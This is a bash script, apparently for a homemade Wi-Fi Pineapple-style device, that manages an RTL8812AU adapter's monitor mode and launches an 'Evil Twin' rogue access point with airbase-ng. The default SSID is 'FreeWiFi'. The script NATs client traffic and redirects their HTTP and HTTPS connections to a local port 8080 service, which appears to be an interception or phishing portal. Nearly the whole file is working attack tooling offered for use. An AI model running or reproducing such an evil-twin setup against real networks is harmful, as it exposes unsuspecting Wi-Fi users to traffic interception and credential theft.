#!/bin/bash
# PineapplePI Radio Stack Manager — final
# RTL8812AU (88XXau) wlan1:
#   AP mode via nl80211/hostapd HANGS this kernel — use airbase-ng instead
#   airbase-ng runs in monitor mode, creates at0 tap interface for clients

IFACE="wlan1"
DRIVER="88XXau"
AP_IP="10.0.0.1"
HOSTAPD_CONF="/opt/pineapple/config/hostapd.conf"
LOG_DIR="/var/log/pineapple"
LOGFILE="${LOG_DIR}/radio.log"

mkdir -p "${LOG_DIR}"

ts()  { date '+%Y-%m-%d %H:%M:%S'; }
log() { echo "[$(ts)] RADIO: $*" | tee -a "${LOGFILE}"; }
die() { log "ERROR: $*"; exit 1; }

# ── Driver reload ─────────────────────────────────────────────────────────────
reload_driver() {
    log "Перезагружаю драйвер ${DRIVER}..."
    pkill -f "airodump-ng"  2>/dev/null || true
    pkill -f "aireplay-ng"  2>/dev/null || true
    pkill -f "airbase-ng"   2>/dev/null || true
    pkill -f "hostapd"      2>/dev/null || true
    sleep 0.5
    ip link set at0       down 2>/dev/null || true
    ip link del  at0           2>/dev/null || true
    ip link set "${IFACE}" down 2>/dev/null || true
    modprobe -r "${DRIVER}" 2>/dev/null || true
    sleep 2
    modprobe "${DRIVER}" || die "modprobe ${DRIVER} failed"
    sleep 2
    # Wait for wlan1 to appear
    local n=0
    while ! ip link show "${IFACE}" >/dev/null 2>&1; do
        sleep 0.5; n=$((n+1))
        [ ${n} -ge 12 ] && die "${IFACE} не появился после modprobe"
    done
    # Immediately tell NetworkManager to leave wlan1 alone
    nmcli dev set "${IFACE}" managed no 2>/dev/null || true
    sleep 1  # Give NM time to release it
    log "Драйвер перезагружен, ${IFACE} готов (NM: unmanaged)"
}

detect_uplink() {
    for DEV in end1 end0 eth1 eth0; do
        ip route show default | grep -q "dev ${DEV}" && { echo "${DEV}"; return; }
    done
    echo "end1"
}

# ── Set monitor mode (shared by start_monitor and start_ap) ───────────────────
set_monitor() {
    ip link set "${IFACE}" down
    sleep 0.3
    iw dev "${IFACE}" set type monitor 2>/dev/null || true
    ip link set "${IFACE}" up
    sleep 0.5
    local TYPE
    TYPE=$(iw dev "${IFACE}" info 2>/dev/null | awk '/type/{print $2}')
    if [ "${TYPE}" != "monitor" ]; then
        # Second attempt — sometimes needs a moment
        ip link set "${IFACE}" down
        sleep 0.5
        iw dev "${IFACE}" set type monitor 2>/dev/null || true
        ip link set "${IFACE}" up
        sleep 0.5
        TYPE=$(iw dev "${IFACE}" info 2>/dev/null | awk '/type/{print $2}')
    fi
    [ "${TYPE}" = "monitor" ] || die "Не удалось включить monitor mode (got: ${TYPE})"
    log "${IFACE} type=monitor OK"
}

# ── Monitor mode ──────────────────────────────────────────────────────────────
start_monitor() {
    log "=== start_monitor ==="
    reload_driver
    set_monitor
    iw dev "${IFACE}" info | tee -a "${LOGFILE}"
    log "=== start_monitor done ==="
}

stop_monitor() {
    log "=== stop_monitor ==="
    pkill -f "airodump-ng" 2>/dev/null || true
    pkill -f "aireplay-ng" 2>/dev/null || true
    pkill -f "airbase-ng"  2>/dev/null || true
    sleep 0.3
    reload_driver
    ip link set "${IFACE}" up 2>/dev/null || true
    nmcli dev set "${IFACE}" managed yes 2>/dev/null || true
    log "${IFACE} managed"
    log "=== stop_monitor done ==="
}

# ── Evil Twin AP via airbase-ng ───────────────────────────────────────────────
start_ap() {
    local SSID="${2:-FreeWiFi}"
    local CHANNEL="${3:-6}"
    echo "${CHANNEL}" | grep -qE '^[0-9]+$' || CHANNEL=6
    log "=== start_ap SSID=${SSID} CH=${CHANNEL} ==="

    reload_driver
    set_monitor

    # Write config for reference
    printf 'interface=%s\nssid=%s\nchannel=%s\n# airbase-ng mode\n' \
        "${IFACE}" "${SSID}" "${CHANNEL}" > "${HOSTAPD_CONF}"

    # NAT prep
    local UPLINK
    UPLINK=$(detect_uplink)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -D POSTROUTING -o "${UPLINK}" -j MASQUERADE 2>/dev/null || true
    iptables -t nat -A POSTROUTING -o "${UPLINK}" -j MASQUERADE
    iptables -D FORWARD -i at0 -o "${UPLINK}" -j ACCEPT 2>/dev/null || true
    iptables -A FORWARD -i at0 -o "${UPLINK}" -j ACCEPT
    iptables -D FORWARD -i "${UPLINK}" -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
    iptables -A FORWARD -i "${UPLINK}" -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    log "NAT через ${UPLINK} готов"

    # Launch airbase-ng
    log "airbase-ng -e ${SSID} -c ${CHANNEL} ${IFACE}"
    airbase-ng -e "${SSID}" -c "${CHANNEL}" "${IFACE}" >> "${LOGFILE}" 2>&1 &
    local AIRBASE_PID=$!
    echo "${AIRBASE_PID}" > /tmp/airbase.pid
    log "airbase-ng PID=${AIRBASE_PID}"

    # Wait for at0 (up to 8s)
    local n=0
    while ! ip link show at0 >/dev/null 2>&1; do
        sleep 0.5; n=$((n+1))
        if [ ${n} -ge 16 ]; then
            kill -0 "${AIRBASE_PID}" 2>/dev/null || die "airbase-ng exited — check ${LOGFILE}"
            die "at0 не появился за 8с"
        fi
    done
    log "at0 создан"

    ip link set at0 up
    ip addr flush dev at0 2>/dev/null || true
    ip addr add "${AP_IP}/24" dev at0

    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80  -j DNAT --to-destination "${AP_IP}:8080" 2>/dev/null || true
    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination "${AP_IP}:8080" 2>/dev/null || true

    log "=== start_ap done: SSID=${SSID} CH=${CHANNEL} @ ${AP_IP} ==="
    echo "AIRBASE_PID=${AIRBASE_PID}"
}

stop_ap() {
    log "=== stop_ap ==="
    pkill -f "airbase-ng"   2>/dev/null || true
    pkill -f "dnsmasq.*at0" 2>/dev/null || true
    rm -f /tmp/airbase.pid
    sleep 0.3
    ip link set at0 down 2>/dev/null || true
    ip link del  at0      2>/dev/null || true
    local UPLINK
    UPLINK=$(detect_uplink)
    iptables -t nat -D POSTROUTING -o "${UPLINK}" -j MASQUERADE 2>/dev/null || true
    iptables -t nat -F PREROUTING  2>/dev/null || true
    iptables -F FORWARD            2>/dev/null || true
    reload_driver
    ip link set "${IFACE}" up 2>/dev/null || true
    nmcli dev set "${IFACE}" managed yes 2>/dev/null || true
    log "=== stop_ap done ==="
}

show_status() {
    echo "IFACE=${IFACE}  DRIVER=${DRIVER}  AP_IP=${AP_IP}"
    iw dev 2>/dev/null || true
    if ip link show at0 >/dev/null 2>&1; then
        echo "STATUS=ap (at0 up, airbase-ng running)"
    elif iw dev "${IFACE}" info 2>/dev/null | grep -q "type monitor"; then
        echo "STATUS=monitor"
    else
        echo "STATUS=managed"
    fi
}

CMD="${1:-status}"
case "${CMD}" in
    start_monitor|monitor-start) start_monitor ;;
    stop_monitor|monitor-stop)   stop_monitor ;;
    start_ap|ap-start)           start_ap "$@" ;;
    stop_ap|ap-stop)             stop_ap ;;
    status)                      show_status ;;
    *) echo "Usage: $0 {start_monitor|stop_monitor|start_ap [ssid] [ch]|stop_ap|status}"; exit 1 ;;
esac
